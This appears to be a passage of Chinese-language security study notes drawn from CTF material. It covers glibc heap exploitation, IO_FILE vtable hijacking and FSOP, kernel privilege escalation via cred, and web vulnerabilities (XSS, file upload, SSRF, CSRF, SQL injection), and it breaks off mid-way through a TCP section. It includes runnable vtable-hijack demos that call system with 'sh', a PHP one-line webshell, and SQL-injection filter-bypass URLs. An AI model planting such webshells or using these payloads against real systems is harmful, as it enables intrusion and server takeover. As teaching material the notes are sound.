(%p): %ld\\n&quot;, &amp;stack_var1, stack_var1);    fprintf(stderr, &quot;stack_var2 (%p): %ld\\n\\n&quot;, &amp;stack_var2, stack_var2);    unsigned long *p1 = malloc(0x320);    malloc(0x20);    unsigned long *p2 = malloc(0x400);    malloc(0x20);    unsigned long *p3 = malloc(0x400);    malloc(0x20);    free(p1);    free(p2);    void* p4 = malloc(0x90);    free(p3);    p2[-1] = 0x3f1;    p2[0] = 0;    p2[2] = 0;    p2[1] = (unsigned long)(&amp;stack_var1 - 2); // fake_chunk -&gt; fd = heap_address    p2[3] = (unsigned long)(&amp;stack_var2 - 4); // fake_chunk2 -&gt; fd_next_size = heap_address    malloc(0x90);    fprintf(stderr, &quot;stack_var1 (%p): %p\\n&quot;, &amp;stack_var1, (void *)stack_var1);    fprintf(stderr, &quot;stack_var2 (%p): %p\\n&quot;, &amp;stack_var2, (void *)stack_var2);         return 0;&#125;\n\nhouse of rabitref: https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-rabbit/\nhouse of loreref: https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/\t\nhouse of pigref: https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-pig/\nhouse of roman这里说的是比较流行的方法，不是原作者方法。\nHouse of Roman 这个技巧其实就是 fastbin attack 和 Unsortbin leak、partial overwrite 、结合的一个小 招式。\n概括该技术用于在未知道glibc地址的情况下，利用fastbin、unsorted bin还有partial overwrite来实现5-bit 的爆破达到获取 shell 的目的，1&#x2F;16。源作者是12bit，1&#x2F;4096\n且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。\n原理以及展示 \n将 FD 指向 malloc_hook修正 0x71 的 fastbin list往 malloc_hook 写入 one gadget\nhouse of forceref: https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/\nIO_FILE介绍IO_FILE是用于描述文件的结构，其作用主要是起缓冲作用，有一定程度提升IO读写性能。在c语言标准库中，FILE结构体也就是一个IO_FILE。在标准IO中，比如stdin、stdout、stderr这些也是IO_FILE结构体，它们已定义在libc.so中，若是打开其他文件，则IO_FILE结构体在堆上。\n可以在 libc.so 中找到 stdin、stdout、stderr 等变量，这些变量是指向 FILE 结构的指针，真正结构的符号是 IO_2_1_stderr_、_IO_2_1_stdout_、_IO_2_1_stdin\n事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。\nlibc2.23版本下，32 位的vtable 偏移为 0x94，64 位偏移为 0xd8\nstruct _IO_FILE_plus&#123;    _IO_FILE    file;    IO_jump_t   *vtable;&#125;\n\nIO_FILE结构体\nstruct _IO_FILE &#123;  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;...int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset; // vtable偏移  char _shortbuf[1];...&#125;;\n\n攻击伪造vtable实现劫持\nvtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针void * funcs[] = &#123;   1 NULL, // &quot;extra word&quot;   2 NULL, // DUMMY   3 exit,    // finish #    4 NULL, // overflow // FSOP,   5 NULL, // underflow   6 NULL, // uflow   7 NULL, // pbackfail      8 NULL,   // xsputn  #printf，fwrite // xsputn(fp);   9 NULL,   // xsgetn  # fread   10 NULL, // seekoff   11 NULL, // seekpos   12 NULL, // setbuf   13 NULL, // sync   14 NULL, // doallocate   15 NULL, // read   16 NULL, // write   17 NULL, // seek   18 pwn,  // close   19 NULL, // stat   20 NULL, // showmanyc   21 NULL, // imbue&#125;;\n\n劫持手段1-修改vtable指向的内存\n#include &lt;stdio.h&gt;int main(void) &#123;    FILE *fp;    long long *vtable_ptr;    fp=fopen(&quot;/dev/null&quot;,&quot;rw&quot;);    vtable_ptr= *(long long*)((long long)fp + 0xd8); //get vtable    vtable_ptr[7]=0x1234; //xsputn    printf(&quot;call 0x1234&quot;); // 调用xsputn指针&#125;\n\n劫持手段2-修改vtable指针指向我们伪造的vtable\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(void) &#123;    FILE *fp;    long long *fake_vtable;    fp=fopen(&quot;/dev/null&quot;,&quot;rw&quot;);    fake_vtable=malloc(0x40);    *(long long *)((long long)fp + 0xd8) = fake_vtable;     //vtable offset    memcpy(fp,&quot;sh&quot;,3);    fake_vtable[7]= &amp;system; //xsputn    fwrite(&quot;call&quot;, 4, 1, fp);&#125;\n\n\n\nFSOPFSOP(File Stream Oriented Programming)介绍\n_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。\nFSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。\n在经典利用手段house of orange的核心就是采用fsop达到利用\nFSOP - 如何触发调用？\n意义是为了保证数据不丢失，因此在程序执行退出相关代码时，会去调用函数去刷新缓冲区，确保数据被保存。会_IO_flush_all_lockp调用函数的时机包括：\n\nlibc执行abort函数时。\n\n程序执行exit函数时。\n\n程序从main函数返回时。\n\n\nFSOP - 绕过检查\nif (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)            || (_IO_vtable_offset (fp) == 0               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))           )          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)        result = EOF;\n\n则fp-&gt;_mode &lt;&#x3D; 0 且fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 且_IO_vtable_offset (fp) &#x3D;&#x3D; 0,这样才能执行_IO_OVERFLOW (fp, EOF) &#x3D;&#x3D; EOF)\nhouse of orangehouse of orange是结合堆利用与FSOP技术的一种攻击手段\n利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于程序中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。\n在堆中伪造一个IO_FILE，通过FSOP达到程序流劫持。\n使用堆溢出修改top chunk大小(按照内存对其), 再申请一个大小大于top chunk size 的chunk,然而old top chunk就会被free掉,申请一个large bin大小的chunk,由于large bin申请成功后fd_nextsize和bk_nextsize会指向自身地址,可以泄漏heap地址,然而,申请的位置也恰好含有以前所剩的main_arena信息,所以直接打印即可泄漏libc. 后面就通过unsorted bin attack修改IO_list_all为main_arena + 0x58, 然后根据small bin管理机制,修改main_arena  + 0x58处的fake IO_FILE的chain的值指向伪造的IO_FILE,而使伪造堆块满足fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 然后会调用vtable中的__overflow 函数,然而我们可以伪造再一个vtable,实现在调用__overflow的时候调用我们的函数,这里函数就改为system,传入参数需要在伪造的IO_FILE头部写入&#39;/bin/sh\\x00&#39;然后在unsoretd bin被破坏之后再次申请时报错, 那触发异常就会打印错误信息,malloc_printerr是malloc中用来打印错误的函数，而 malloc_printerr其实是调用 __libc_message函数之后调用abort函数，abort&#96;函数其中调用了_IO_flush_all_lockp, 然后根据IO_list_all中的值去遍历IO_FILE调用IO_FILE 的vtable中的 __overflow函数指针, 然后就可以调用system 传入 ‘&#x2F;bin&#x2F;sh\\00’ get shellIO_FILE-&gt; chian -&gt; malloc(0x68);\nKernel内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源。这里从两种角度来考虑如何提权\n\n改变自身：通过改变自身进程的权限，使其具有 root 权限。\n改变别人：通过影响高权限进程的执行，使其完成我们想要的功能。\n\nref: https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/#kernel\ncred内核会通过进程的 task_struct 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限。\nstruct cred &#123;    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC  0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif    kuid_t      uid;        /* real UID of the task */    kgid_t      gid;        /* real GID of the task */    kuid_t      suid;       /* saved UID of the task */    kgid_t      sgid;       /* saved GID of the task */    kuid_t      euid;       /* effective UID of the task */    kgid_t      egid;       /* effective GID of the task */    kuid_t      fsuid;      /* UID for VFS ops */    kgid_t      fsgid;      /* GID for VFS ops */  ...&#125;\n\n因此，思路就比较直观了，我们可以通过以下方式来提权\n\n直接修改 cred 结构体的内容\n修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred\n\n无论是哪一种方法，一般都分为两步：定位，修改。\n直接改 cred\n定位具体位置\n我们可以首先获取到 cred 的具体地址，然后修改 cred。\n定位\n定位 cred 的具体地址有很多种方法，这里根据是否直接定位分为以下两种\n直接定位cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid-fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred。\nstruct cred &#123;    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC  0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif    kuid_t      uid;        /* real UID of the task */    kgid_t      gid;        /* real GID of the task */    kuid_t      suid;       /* saved UID of the task */    kgid_t      sgid;       /* saved GID of the task */    kuid_t      euid;       /* effective UID of the task */    kgid_t      egid;       /* effective GID of the task */    kuid_t      fsuid;      /* UID for VFS ops */    kgid_t      fsgid;      /* GID for VFS ops */  ...&#125;\n\n在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。一个很直观的想法是在定位的过程中，利用 usage 不为 0 来筛除掉一些 cred，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。\n间接定位\ntask_struct进程的 task_struct 结构体中会存放指向 cred 的指针，因此我们可以\n\n定位当前进程 task_struct 结构体的地址\n根据 cred 指针相对于 task_struct 结构体的偏移计算得出 cred 指针存储的地址\n获取 cred 具体的地址\n\ncommcomm 用来标记可执行文件的名字，位于进程的 task_struct 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。\n    /* Process credentials: */    /* Tracer&#x27;s credentials at attach: */    const struct cred __rcu     *ptracer_cred;    /* Objective and real subjective task credentials (COW): */    const struct cred __rcu     *real_cred;    /* Effective (overridable) subjective task credentials (COW): */    const struct cred __rcu     *cred;#ifdef CONFIG_KEYS    /* Cached requested key. */    struct key          *cached_requested_key;#endif    /*     * executable name, excluding path.     *     * - normally initialized setup_new_exec()     * - access it with [gs]et_task_comm()     * - lock it with task_lock()     */    char                comm[TASK_COMM_LEN];\n\n然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。\n修改\n在这种方法下，我们可以直接将 cred 中的 uid-fsgid 都修改为 0。当然修改的方式有很多种，比如说\n\n在我们具有任意地址读写后，可以直接修改 cred。\n在我们可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。\n\n间接定位 \n虽然我们确实想要修改 cred 的内容，但是不一定非得知道 cred 的具体位置，我们只需要能够修改 cred 即可。\nUAF 使用同样堆块\n如果我们在进程初始化时能控制 cred 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的。这里给出一个典型的例子\n\n申请一块与 cred 结构体大小一样的堆块\n释放该堆块\nfork 出新进程，恰好使用刚刚释放的堆块\n此时，修改 cred 结构体特定内存，从而提权\n\n非常有意思的是，在这个过程中，我们不需要任何的信息泄露。\n修改 cred 指针\n定位具体位置\n在这种方式下，我们需要知道 cred 指针的具体地址。\n定位\n直接定位\n显然，cred 指针并没有什么非常特殊的地方，所以很难通过直接定位的方式定位到 cred 指针。\n间接定位\ntask_struct\n进程的 task_struct 结构体中会存放指向 cred 的指针，因此我们可以\n\n定位当前进程 task_struct 结构体的地址\n根据 cred 指针相对于 task_struct 结构体的偏移计算得出 cred 指针存储的地址\n\ncommon\ncomm 用来标记可执行文件的名字，位于进程的 task_struct 结构体中。我们可以发现 comm 其实在 cred 指针的正下方，所以我们也可以先定位 comm ，然后定位 cred 指针的地址。\n    /* Process credentials: */    /* Tracer&#x27;s credentials at attach: */    const struct cred __rcu     *ptracer_cred;    /* Objective and real subjective task credentials (COW): */    const struct cred __rcu     *real_cred;    /* Effective (overridable) subjective task credentials (COW): */    const struct cred __rcu     *cred;#ifdef CONFIG_KEYS    /* Cached requested key. */    struct key          *cached_requested_key;#endif    /*     * executable name, excluding path.     *     * - normally initialized setup_new_exec()     * - access it with [gs]et_task_comm()     * - lock it with task_lock()     */    char                comm[TASK_COMM_LEN];\n\n然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。\n修改\n在具体修改时，我们可以使用如下的两种方式\n\n修改 cred 指针为内核镜像中已有的 init_cred 的地址。这种方法适合于我们能够直接修改 cred 指针以及知道 init_cred 地址的情况。\n伪造一个 cred，然后修改 cred 指针指向该地址即可。这种方式比较麻烦，一般并不使用。\n\n间接定位commit_creds(prepare_kernel_cred(0))\n我们还可以使用 commit_creds(prepare_kernel_cred(0)) 来进行提权，该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred。该方式比较适用于控制程序执行流后使用。\n\n在整个过程中，我们并不知道 cred 指针的具体位置。\nWEB漏洞XSSXSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。\n1、反射型XSS反射型XSS，也称为非持久性XSS，是最常见的一种XSS。\nXSS代码常常出现在URL请求中，当用户访问带有XSS代码的URL请求时，服务器端接收请求并处理，然后将带有XSS代码的数据返回给浏览器，浏览器解析该段带有XSS代码的数据并执行，整个过程就像一次反射，故称为反射型XSS。\n该类攻击的主要特点是它的及时性和一次性，即用户提交请求后，响应信息会立即反馈给用户。该类攻击常发生在搜索引擎、错误提示页面等对用户的输入做出直接反应的场景中。\n2、存储型XSS存储型XSS，也称为持久性XSS。\n在存储型XSS中，XSS代码被存储到服务器端，因此允许用户存储数据到服务器端的Web应用程序可能存在该类型XSS漏洞。攻击者提交一段XSS代码后，服务器接收并存储，当其他用户访问包含该XSS代码的页面时，XSS代码被浏览器解析并执行。\n存储型XSS攻击的特点之一是提交的恶意内容会被永久存储，因而一个单独的恶意代码就会使多个用户受害，故被称为持久性XSS，它也是跨站脚本攻击中危害最的一类。二是被存储的用户提交的恶意内容不一定被页面使用，因此存在危险的响应信息不一定被立即返回，也许在访问那些在时间上和空间上没有直接关联的页面时才会引发攻击，因此存在不确定性和更好的隐蔽性。\n这类攻击的一个典型场景是留言板、博客和论坛等，当恶意用户在某论坛页面发布含有恶意的Javascript代码的留言时，论坛会将该用户的留言内容保存在数据库或文件中并作为页面内容的一部分显示出来。当其他用户查看该恶意用户的留言时，恶意用户提交的恶意代码就会在用户浏览器中解析并执行。\n3、DOM型XSSDOM (Document Objet Model)指文档对象模型。\nDOM常用来表示在HTML和XML中的对象。DOM可以允许程序动态的访问和更新文档的内容、结构等。客户端JavaScript可以访问浏览器的文档对象模型。也就是说，通过JavaScript代码控制DOM节点就可以不经过服务器端的参与重构HTML页面。\n该类攻击是反射型XSS的变种。它通常是由于客户端接收到的脚本代码存在逻辑错误或者使用不当导致的。比如Javascript代码不正确地使用各种DOM方法(如document.write)和Javascript内部函数(如eval函数)，动态拼接HTML代码和脚本代码就容易引发DOM型的跨站脚本攻击。\n因此，DOM型XSS与前面两种XSS的区别就在于DOM型XSS攻击的代码不需要与服务器端进行交互，DOM型XSS的触发基于浏览器端对DOM数据的解析来完成，也就是完全是客户端的事情。\n1、检测手工检测手工检测重点要考虑数据输入的地方，且需要清楚输入的数据输出到什么地方。\n在检测的开始，可以输入一些敏感字符，比如“&lt;、&gt;、（）”等，提交后查看网页源代码的变化以发现输入被输出到什么地方，且可以发现相关敏感字符是否被过滤。\n手工检测结果相对准确，但效率较低。\n工具检测常用工具有AVWS（Acunetix Web Vulnerability Scanner）、BurpSuite等。还有一些专门针对XSS漏洞的检测工具，如：XSSer、XSSF（跨站脚本攻击框架）、BeEF(The Browser Exploitation Framework)等。\n2、防御●使用黑名单进行\n●对HTML标签或特殊字符进行过滤\n●使用内容安全的CSP\n●使用设计上就会自动编码的框架，如：OWASP ESAPI、React JS、JSOUP等，对于JAVA而言，可以使用ESAPI.encoder().encodeForHTML()对字符串进行HTML编码。\n●对于反射型和存储型XSS，可以在数据返回给客户端浏览器时，将敏感字符进行转义，如：将单引号进行编码替换（十进制编码’、十六进制编码’、HTML编码&amp;apos、Unicode编码\\u0027等）。\n●对于DOM型XSS，可以使用上下文敏感数据编码。如：在PHP中的htmlspecialchars（）、htmlentities（）函 数可以将一些预定义的字符转换为HTML实体，如：小于转化为&lt;、大于转化为&gt;、双引号转化为”、单引号转化为&amp;apos、与转化 为&amp;等。\n●启用浏览器的HttpOnly特性可以组织客户端脚本访问cookie。如：在PHP中可以通过下面的代码设置cookie并启用HttpOnly。\n&lt;?php    Header(&quot;Set-Cookie:password=123456;httponly&quot;,false);&gt;\n\n\n\nref: https://blog.csdn.net/xcxhzjl/article/details/121404472\n文件上传漏洞原理大部分的网站和应用系统都有上传功能，而程序员在开发文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。\n这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。\n文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。一般都是指“上传Web脚本能够被服务器解析”的问题。\n漏洞危害可能会导致用户信息泄露，被钓鱼，甚至使攻击者可以直接上传WebShell到服务器，进而得到自己想要的信息和权限。最终达到对数据库执行、服务器文件管理、服务器命令执行等恶意操作，甚至完全控制服务器系统。\nwebshell：运行在web应用之上的远程控制程序 。 webshell分为大马、小马等。功能简易的webshell称为小马，拥有较完整功能的webshell，称为大马。\n一句话木马：\n&lt;?php @eval($_POST[a]); ?&gt;\n\n漏洞利用文件上传漏洞利用条件：\n（1）能够成功上传木马。\n（2）上传的木马能够被web容器解析执行，所以上传路径要在web容器覆盖范围内。\n（3）用户能够访问上传的木马，所以得知道上传的木马准确路径。\nref：https://blog.csdn.net/ma963852/article/details/123085437\nSSRFSSRF (Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞，一般情况下，SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击。\n攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。\nSSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。\n2、漏洞成因1.服务端提供了从其他服务器应用获取数据的功能\n2.没有对目标地址做过滤与限制\n比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载文件等等\n漏洞产生与危害在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数\nref ：https://blog.csdn.net/nobugnomoney/article/details/123953973\nCSRF一、介绍\nCSRF是指利用受害者尚未失效的身份认证信息（ cookie、会话等信息），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向服务器发送请求，从而完成非法操作（如转账、改密、信息修改等操作）。\nCSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用ref ：https://blog.csdn.net/weixin_39861994/article/details/121035470\n二、CSRF类型：get请求型CSRF        只需要构造URL，然后诱导受害者访问利用。\nPOST请求型CSRF        构造自动提交的表单，诱导受惠者访问或者点击\n三、CSRF漏洞危害：以受害者的名义发送邮件、发消息、盗取受害者的账号，甚至购买商品、虚拟货币转账、修改受害者的网络配置（比如修改路由器DNS、重置路由器密码）等等操作。造成的问题包括：个人隐私的泄露、机密资料的泄露、用户甚至企业的财产安全；\n一句话概括CSRF的危害：盗用受害者的身份，受害者能做什么，攻击者就能以受害者的身份做什么。\n四、CSRF漏洞利用思路：寻找有权限进行增删改查操作的功能点：比如修改密码、修改个人信息等等，通过burp构造HTML，修改HTML表单中某些参数，使用浏览器打开该HTML，点击提交表单后查看响应结果，看该操作是否成功执行。\n五、CSRF漏洞修复建议token随机值防御在请求地址中添加token并验证；\nCSRF之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存储在cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的cookie来通过验证。\n要低于CSRF，关键在于在请求中放入和黑客所不能伪造的信息，并且该信息不存在于cookie中。可以在http请求中以参数的形式加入一个随机产生的token，并且在服务器端建立一个拦截器来验证这个token值，如果请求中没有token值或者token不正确，则可以认为可能是CSRF攻击而拒绝请求。\n\nreferer值校验增加HTTP referer的校验：\n\n根据http协议，在http头部中有一个字段叫referer，它记录了该http请求的来源地址。如果referer记录的不是同一个浏览器的请求，那么久可能是攻击者伪造的恶意链接，可以根据此方法来防范CSRF攻击\nSql注入结构化查询语言（Structured Query Language，简称SQL）是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系型数据库。SQL注入漏洞主要形成的原因是Web应用程序对用户的输入没有做严格的判断，导致用户可用将非法的SQL语句拼接到正常的语句中，被当作SQL语句的一部分执行。\n 二、SQL注入分类①按照提交的数据类型有：数字型、字符型和搜索型；\n③按照执行效果有：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入等；\nSQL注入漏洞产生原因及危害\nSQL注入漏洞是指攻击者通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句带入数据库使恶意SQL语句得以执行，从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。SQL注入漏洞可能会造成服务器的数据库信息泄露、数据被窃取、网页被篡改等！！web页面源代码对用户提交的参数没有做出任何过滤限制，直接扔到SQL语句中去执行，导致特殊字符改变了SQL语句原来的功能和逻辑。黑客利用此漏洞执行恶意的SQL语句，如查询数据、下载数据，写webshell、执行系统命令以此来绕过登录权限限制等。\n注入条件\nSQL 注入需要满足以下两个条件：\n  1.参数可控：从前端传给后端的参数内容是用户可以控制的  2.参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。\n盲注\n1.布尔盲注\n没有返回SQL执行的错误信息\n错误与正确的输入，返回的结果只有两种\n使用布尔类型盲注的操作步骤：\n\n构造目标查询语句\n选择拼接方式\n构造判断表达式\n提取数据长度\n提取数据内容\n\n2.时间盲注\n页面上没有显示位和SQL语句执行的错误信息，正确执行和错误执行的返回界面一样，此时需要使用时间类型的盲注。\n时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上使用IF语句加入延时语句来构造，由于时间型盲注耗时较大，通常利用脚本工具来执行，在手工利用的过程中较少使用。\n时间类型盲注的注意事项\n\n通常使用sleep()等专用的延时函数来进行时间盲注，特殊情况下也可以使用某些耗时较高的操作代替这些函数。\n为了提高效率，通常在表达式判断为真时执行延时语句。\n时间盲注语句拼接时无特殊要求，保证语法正确即可。\n\nSQL注入绕过\n空格过滤绕过\n&#x2F;**&#x2F;绕过\nMySQL数据库中可以用&#x2F;**&#x2F;（注释符）来代替空格，将空格用注释符代替后，SQL语句就可以正常运行。例如：\nhttp://192.168.40.1/index.php?id=1/**&#x2F;1&#x3D;2&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,database()\n制表符绕过\n在MySQL数据库中可以用制表符来代替空格，将空格用制表符代替后，SQL语句就可以正常运行。制表符是不可见的，在URL传输中需要编码，其URL编码为%09。例如：\nhttp://192.168.40.1/index.php?id=1%091=2%09union%09select%091,2,database()\n换行符绕过\nMySQL数据库支持换行执行SQL语句，可以利用换行符代替空格，换行符也是不可见字符，其URL编码为%0a。\nhttp://192.168.40.1/index.php?id=1%0a1=2%0aunion%0aselect%0a1,2,database()\n大小写绕过\n根据应用程序的过滤规则中可能存在过滤不完整或者之过滤小写或者大写的情况，此时我们就可以利用大小写混写。\nhttp://192.168.40.1/index.php?id=1 and 1&#x3D;2 union seLeCt 1,2,database()\n双写关键字绕过\n测试代码如下：\nhttp://192.168.40.1/index.php?id=1 and 1&#x3D;2 union seselectlect1,2,database()\n等价函数字符替换绕过\n　　1.用like或in代替&#x3D;\nhttp://192.168.40.1/index.php?id=1 and 1 like 1\n　　2.等价函数\nsleep函数可以用benchmark函数代替。 ascii函数可以用hex、bin函数代替\nref：https://blog.csdn.net/m0_56822024/article/details/125685506\n协议\n\nTCPTCP协议段格式\n\n\n源&#x2F;目的端口号：表示数据从哪个进程来，到那个进程去。源端口号表示报文的发送端口，源端口号和源IP地址组合起来可以表示报文的发送地址。目的端口表示报文的接收端口，目的端口和目的IP地址组合起来可以表示报文的接收地址。TCP协议就是根据IP协议的基础上传输的，TCP报文中的源端口号+源IP，与TCP报文中的目的端口号+目的IP一起，组合起来唯一性的确定一条TCP连接。序号（Sequence Number）：TCP传输过程中，在发送端出的字节流中，传输报文中的数据部分的每一个字节都有它的编号。序号（SequenceNumber）占32位，发起方发送数据时，都需要标记序号。在数据传输过程中，TCP协议通过序号（SequenceNumber）对上层提供有序的数据流。发送端可以用序号来跟踪发送的数据量；接收端可以用序号识别出重复接收到的TCP包，从而丢弃重复包；对于乱序的数据包，接收端也可以依靠序号对其进行排序。序号会根据SYN是否为1，表示不同的意思：当SYN为1时，当前为建立连接阶段；当SYN为0是，数据传输正式开始。确认序号（Acknowledgment Number）：确认序号标识了报文接收端期望接收的字节序列。如果设置了ACK控制位，确认序号的值表示一个准备接收的包的序列号，注意，它所指向的是准备接收的包，也就是下一个期望接收的包的序列号。4位TCP报头长度：表示TCP头部有多少个32位bit（4字节）；所以TCP头部最大长度为 15 * 4 &#x3D; 60字节。6位标志位：\nURG：紧急指针是否有效；ACK：确认号是否有效，ACK置 1 